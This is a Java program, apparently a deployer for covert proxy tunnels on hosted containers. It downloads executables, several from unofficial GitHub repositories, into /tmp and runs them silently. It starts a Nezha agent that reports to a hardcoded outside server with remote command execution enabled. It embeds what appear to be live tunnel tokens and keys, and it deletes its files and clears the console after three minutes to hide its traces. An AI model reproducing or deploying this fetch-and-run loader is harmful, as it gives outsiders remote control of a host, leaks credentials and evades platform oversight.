package com.example.sbx;

import java.io.IOException;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;
import java.time.Duration;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Optional;
import java.util.concurrent.CountDownLatch;
import java.util.stream.Collectors;

public class App {
    private static final HttpClient HTTP = HttpClient.newBuilder()
            .connectTimeout(Duration.ofSeconds(15))
            .followRedirects(HttpClient.Redirect.ALWAYS)
            .build();
    private static final Map<String, String> DOT_ENV = loadDotEnv();

    // ==================== 【在此處填寫你的自訂變數】 ====================
    private static final String UUID_VAL = env("UUID", "faacf142-dee8-48c2-8558-641123eb939c");
    private static final int PORT = envInt("PORT", 3000);
    private static final String NEZHA_SERVER = env("NEZHA_SERVER", "nezha.mingfei1981.eu.org");
    private static final String NEZHA_PORT = env("NEZHA_PORT", "443");
    private static final String NEZHA_KEY = env("NEZHA_KEY", "LthWZY7Fu8TAiio6Cu");
    private static final String ARGO_DOMAIN = env("ARGO_DOMAIN", "laternodes.mingfei.de5.net");
    private static final String ARGO_TOKEN = env("ARGO_TOKEN", "eyJhIjoiNjgyNWI4YTZjODBhYWQxODlmYWI5ZWEwMDI5YzY2NjgiLCJ0IjoiYzhjNTRmZDUtNGZjNS00YTBlLWJiZmMtOGExNmI4ZjMyNjE5IiwicyI6Ik9EazJOemhsT1RjdE1UUm1ZeTAwTldNNUxXRmhaVGN0TkRVNE5UQXpOalUyTW1ZNSJ9");
    private static final String WSPORT = env("WSPORT", "8001");
    private static final String TOKEN = env("TOKEN", "babama123");
    private static final String OPERA = env("OPERA", "0");
    private static final String IPS = env("IPS", "4");
    private static final String COUNTRY = env("COUNTRY", "AM");
    // ====================================================================

    private static final Path RUNTIME_DIR = Path.of("/tmp").toAbsolutePath().normalize();
    private static final Path NEZHA_CONFIG_PATH = RUNTIME_DIR.resolve("nezha.yaml");
    private static final String ARCH = detectArch();

    // 用于管理拉起的后台子进程
    private static final List<Process> EXTERNAL_PROCESSES = new ArrayList<>();

    public static void main(String[] args) throws Exception {
        validateParams();

        // 1) 启动 HTTP 保活，防止容器崩溃
        startKeepAliveServer(PORT);

        // 2) 启动核心逻辑
        startServices();
    }

    private static void validateParams() {
        String countryUpper = COUNTRY.toUpperCase();
        if ("1".equals(OPERA)) {
            if (!List.of("AM", "AS", "EU").contains(countryUpper)) {
                System.err.println("Error: Invalid COUNTRY for OPERA=1");
                System.exit(1);
            }
        } else if (!"0".equals(OPERA)) {
            System.err.println("Error: OPERA must be 0 or 1");
            System.exit(1);
        }

        if (!"4".equals(IPS) && !"6".equals(IPS)) {
            System.err.println("Error: IPS must be 4 or 6");
            System.exit(1);
        }
    }

    private static void startServices() throws Exception {
        Files.createDirectories(RUNTIME_DIR);
        cleanupOldFiles();

        int echPort = isValidPort(WSPORT) ? Integer.parseInt(WSPORT) : getFreePort();
        int operaPort = getFreePort();

        // 下载核心组件（全部作为独立可执行程序处理）
        String baseUrl = "https://github.com/webappstars/ech-hug/releases/download/3.0"; 
        Path echLib = downloadLibrary(baseUrl + "/ech-tunnel-linux-" + ARCH, "ech.so");
        
        Path operaLib = null;
        if ("1".equals(OPERA)) {
            String opUrl = "https://github.com/Alexey71/opera-proxy/releases/download/v1.22.0/opera-proxy.linux-" + ARCH;
            // 将其下载并保存为独立可执行程序后缀
            operaLib = downloadLibrary(opUrl, "opera-proxy");
        }

        // cloudflared 属于可执行程序
        Path cloudflaredExe = downloadLibrary("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-" + ARCH, "cf-tunnel");

        // 哪吒客户端属于可执行程序
        Path nezhaExe = null;
        if (!NEZHA_SERVER.isEmpty() && !NEZHA_KEY.isEmpty()) {
            String nzUrl = "https://github.com/babama1001980/good/releases/download/npc/" + ARCH + "agent";
            nezhaExe = downloadLibrary(nzUrl, "nezha-agent");
        }

        // 1) 启动哪吒探针 (Process 方式)
        if (nezhaExe != null) {
            List<String> cmd = new ArrayList<>();
            cmd.add(nezhaExe.toString());
            if (!NEZHA_PORT.isEmpty()) {
                cmd.addAll(List.of("-s", NEZHA_SERVER + ":" + NEZHA_PORT, "-p", NEZHA_KEY, "--disable-auto-update", "--report-delay", "1", "--skip-conn", "--skip-procs"));
                if (List.of("443", "8443", "2096", "2087", "2083", "2053").contains(NEZHA_PORT)) {
                    cmd.add("--tls");
                }
            } else {
                generateNezhaConfig();
                cmd.addAll(List.of("-c", NEZHA_CONFIG_PATH.toString()));
            }
            startExternalProcess("Nezha Agent", cmd);
        }

        // 2) 启动 Opera 代理 (改为 Process 方式启动)
        if (operaLib != null) {
            List<String> cmd = new ArrayList<>();
            cmd.add(operaLib.toString());
            cmd.addAll(List.of("-country", COUNTRY.toUpperCase(), "-socks-mode", "-bind-address", "127.0.0.1:" + operaPort));
            startExternalProcess("Opera Proxy", cmd);
        }

        // 3) 启动 ECH 代理 (彻底移除 JNA，改用标准的 Process 独立进程启动)
        if (echLib != null) {
            List<String> cmd = new ArrayList<>();
            cmd.add(echLib.toString());
            cmd.addAll(List.of("-l", "ws://0.0.0.0:" + echPort));
            if (!TOKEN.isEmpty()) {
                cmd.add("-token");
                cmd.add(TOKEN);
            }
            if ("1".equals(OPERA)) {
                cmd.add("-f");
                cmd.add("socks5://127.0.0.1:" + operaPort);
            }
            startExternalProcess("ECH Server", cmd);
        }

        // 4) 启动 Cloudflared (Process 方式)
        if (cloudflaredExe != null) {
            List<String> cmd = new ArrayList<>();
            cmd.add(cloudflaredExe.toString());
            cmd.addAll(List.of("--edge-ip-version", IPS, "--protocol", "http2"));
            if (!ARGO_TOKEN.isEmpty()) {
                cmd.addAll(List.of("tunnel", "run", "--token", ARGO_TOKEN));
            } else {
                int metricsPort = getFreePort();
                cmd.addAll(List.of("tunnel", "--url", "127.0.0.1:" + echPort, "--metrics", "0.0.0.0:" + metricsPort));
            }
            startExternalProcess("Cloudflared", cmd);
        }

        // 注册关闭钩子清理所有的子进程
        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            stopAllExternal();
        }, "shutdown-hook"));

        // 3 分钟后（180秒）自动无痕清理文件并清屏
        Thread cleanupThread = new Thread(() -> {
            sleep(180000);
            cleanupFiles();
            clearConsole();
        }, "delayed-cleanup");
        cleanupThread.setDaemon(true);
        cleanupThread.start();

        // 阻塞主线程以保持服务常驻
        new CountDownLatch(1).await();
    }

    private static void startExternalProcess(String name, List<String> command) {
        Thread thread = new Thread(() -> {
            try {
                ProcessBuilder pb = new ProcessBuilder(command);
                // 抛弃输出流，防止缓冲区堵塞导致挂起，同时保持控制台整洁
                pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
                pb.redirectError(ProcessBuilder.Redirect.DISCARD);
                Process process = pb.start();
                synchronized (EXTERNAL_PROCESSES) {
                    EXTERNAL_PROCESSES.add(process);
                }
                int exitCode = process.waitFor();
                System.out.println(name + " exited with code " + exitCode);
            } catch (Exception e) {
                System.err.println("Failed to start external process " + name + ": " + e.getMessage());
            }
        }, name + "-launcher");
        thread.setDaemon(true);
        thread.start();
    }

    private static void stopAllExternal() {
        System.out.println("Stopping all external processes...");
        synchronized (EXTERNAL_PROCESSES) {
            for (Process p : EXTERNAL_PROCESSES) {
                try {
                    if (p.isAlive()) {
                        p.destroyForcibly();
                    }
                } catch (Exception ignored) {}
            }
            EXTERNAL_PROCESSES.clear();
        }
    }

    private static void startKeepAliveServer(int port) {
        Thread serverThread = new Thread(() -> {
            try (ServerSocket serverSocket = new ServerSocket(port)) {
                while (true) {
                    try (Socket socket = serverSocket.accept();
                         OutputStream os = socket.getOutputStream()) {
                        String response = "HTTP/1.1 200 OK\r\nContent-Type: text/plain; charset=utf-8\r\n\r\nOK";
                        os.write(response.getBytes(StandardCharsets.UTF_8));
                        os.flush();
                    } catch (IOException ignored) {}
                }
            } catch (IOException e) {
                System.err.println("Keep-alive server failed: " + e.getMessage());
            }
        }, "keep-alive-server");
        serverThread.setDaemon(true);
        serverThread.start();
    }

    private static int getFreePort() {
        return (int) (Math.random() * 20000) + 10000;
    }

    private static Path downloadLibrary(String url, String fileName) throws Exception {
        Path target = RUNTIME_DIR.resolve(fileName);
        if (Files.exists(target)) {
            return target;
        }
        Files.createDirectories(RUNTIME_DIR);
        Path tmp = RUNTIME_DIR.resolve(fileName + ".download");
        System.out.println("Downloading " + url + " -> " + target);

        HttpRequest request = HttpRequest.newBuilder(URI.create(url))
                .timeout(Duration.ofMinutes(3))
                .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
                .header("Accept", "*/*")
                .GET()
                .build();

        HttpResponse<byte[]> response = HTTP.send(request, HttpResponse.BodyHandlers.ofByteArray());
        if (response.statusCode() < 200 || response.statusCode() >= 300) {
            throw new IOException("Failed to download " + url + ": HTTP " + response.statusCode());
        }
        Files.write(tmp, response.body());
        Files.move(tmp, target, StandardCopyOption.REPLACE_EXISTING);
        target.toFile().setExecutable(true, false);
        return target;
    }

    private static void generateNezhaConfig() throws IOException {
        String nzPort = NEZHA_SERVER.contains(":") ? NEZHA_SERVER.substring(NEZHA_SERVER.lastIndexOf(':') + 1) : "";
        boolean tls = List.of("443", "8443", "2096", "2087", "2083", "2053").contains(nzPort);
        String yaml = "client_secret: " + NEZHA_KEY + "\n" +
                "debug: false\n" +
                "disable_auto_update: true\n" +
                "disable_command_execute: false\n" +
                "disable_force_update: true\n" +
                "disable_nat: false\n" +
                "disable_send_query: false\n" +
                "gpu: false\n" +
                "insecure_tls: false\n" +
                "ip_report_period: 1800\n" +
                "report_delay: 1\n" +
                "server: " + NEZHA_SERVER + "\n" +
                "skip_connection_count: false\n" +
                "skip_procs_count: false\n" +
                "temperature: false\n" +
                "tls: " + tls + "\n" +
                "use_gitee_to_upgrade: false\n" +
                "use_ipv6_country_code: false\n" +
                "uuid: " + UUID_VAL;
        Files.writeString(NEZHA_CONFIG_PATH, yaml, StandardCharsets.UTF_8);
    }

    private static void cleanupOldFiles() {
        for (String file : List.of("ech.so", "opera-proxy", "cf-tunnel", "nezha-agent", "nezha.yaml")) {
            try { Files.deleteIfExists(RUNTIME_DIR.resolve(file)); } catch (IOException ignored) {}
        }
    }

    private static void cleanupFiles() {
        cleanupOldFiles();
    }

    private static String detectArch() {
        String arch = System.getProperty("os.arch", "").toLowerCase();
        return arch.contains("aarch64") || arch.contains("arm64") ? "arm64" : "amd64";
    }

    private static boolean isValidPort(String port) {
        try {
            if (port == null || port.isBlank()) return false;
            int n = Integer.parseInt(port.trim());
            return n >= 1 && n <= 65535;
        } catch (Exception e) {
            return false;
        }
    }

    private static String env(String name, String fallback) {
        String value = DOT_ENV.get(name);
        if (value == null) value = System.getenv(name);
        return value == null || value.isEmpty() ? fallback : value;
    }

    private static int envInt(String name, int fallback) {
        try { return Integer.parseInt(env(name, String.valueOf(fallback))); } catch (Exception e) { return fallback; }
    }

    private static Map<String, String> loadDotEnv() {
        Map<String, String> values = new LinkedHashMap<>();
        Path envPath = Path.of(".env").toAbsolutePath().normalize();
        if (!Files.exists(envPath)) return values;
        try {
            for (String line : Files.readAllLines(envPath, StandardCharsets.UTF_8)) {
                parseDotEnvLine(line).ifPresent(entry -> values.put(entry.getKey(), entry.getValue()));
            }
        } catch (IOException e) {
            System.out.println("Failed to read .env: " + e.getMessage());
        }
        return values;
    }

    private static Optional<Map.Entry<String, String>> parseDotEnvLine(String line) {
        String trimmed = line.trim();
        if (trimmed.isEmpty() || trimmed.startsWith("#")) return Optional.empty();
        if (trimmed.startsWith("export ")) trimmed = trimmed.substring("export ".length()).trim();
        int equals = trimmed.indexOf('=');
        if (equals <= 0) return Optional.empty();
        String key = trimmed.substring(0, equals).trim();
        if (key.isEmpty()) return Optional.empty();
        String value = trimmed.substring(equals + 1).trim();
        return Optional.of(Map.entry(key, parseDotEnvValue(value)));
    }

    private static String parseDotEnvValue(String value) {
        if (value.length() >= 2) {
            char quote = value.charAt(0);
            if ((quote == '"' || quote == '\'') && value.charAt(value.length() - 1) == quote) {
                value = value.substring(1, value.length() - 1);
                return quote == '"' ? unescapeDotEnvValue(value) : value;
            }
        }
        return stripInlineComment(value).trim();
    }

    private static String stripInlineComment(String value) {
        for (int i = 0; i < value.length(); i++) {
            if (value.charAt(i) == '#' && (i == 0 || Character.isWhitespace(value.charAt(i - 1)))) {
                return value.substring(0, i);
            }
        }
        return value;
    }

    private static String unescapeDotEnvValue(String value) {
        StringBuilder out = new StringBuilder();
        boolean escaped = false;
        for (int i = 0; i < value.length(); i++) {
            char c = value.charAt(i);
            if (escaped) {
                switch (c) {
                    case 'n': out.append('\n'); break;
                    case 'r': out.append('\r'); break;
                    case 't': out.append('\t'); break;
                    default: out.append(c);
                }
                escaped = false;
            } else if (c == '\\') {
                escaped = true;
            } else {
                out.append(c);
            }
        }
        if (escaped) out.append('\\');
        return out.toString();
    }

    private static String toJson(Object value) {
        if (value == null) return "null";
        if (value instanceof String) return "\"" + escapeJson((String) value) + "\"";
        if (value instanceof Number || value instanceof Boolean) return value.toString();
        if (value instanceof Map<?, ?>) {
            Map<?, ?> map = (Map<?, ?>) value;
            return map.entrySet().stream()
                    .map(e -> toJson(String.valueOf(e.getKey())) + ":" + toJson(e.getValue()))
                    .collect(Collectors.joining(",", "{", "}"));
        }
        if (value instanceof Iterable<?>) {
            Iterable<?> iterable = (Iterable<?>) value;
            List<String> items = new ArrayList<>();
            for (Object item : iterable) items.add(toJson(item));
            return String.join(",", items).replaceFirst("^", "[") + "]";
        }
        return toJson(String.valueOf(value));
    }

    private static String escapeJson(String value) {
        StringBuilder out = new StringBuilder();
        for (int i = 0; i < value.length(); i++) {
            char c = value.charAt(i);
            switch (c) {
                case '\\': out.append("\\\\"); break;
                case '"': out.append("\\\""); break;
                case '\n': out.append("\\n"); break;
                case '\r': out.append("\\r"); break;
                case '\t': out.append("\\t"); break;
                default: out.append(c);
            }
        }
        return out.toString();
    }

    private static Map<String, Object> mapOf(Object... values) {
        Map<String, Object> map = new LinkedHashMap<>();
        for (int i = 0; i < values.length; i += 2) map.put(String.valueOf(values[i]), values[i + 1]);
        return map;
    }

    private static List<Object> listOf(Object... values) {
        return new ArrayList<>(List.of(values));
    }

    private static void clearConsole() {
        System.out.print("\033[H\033[2J");
        System.out.flush();
    }

    private static void sleep(long millis) {
        try { Thread.sleep(millis); } catch (InterruptedException e) { Thread.currentThread().interrupt(); }
    }
}
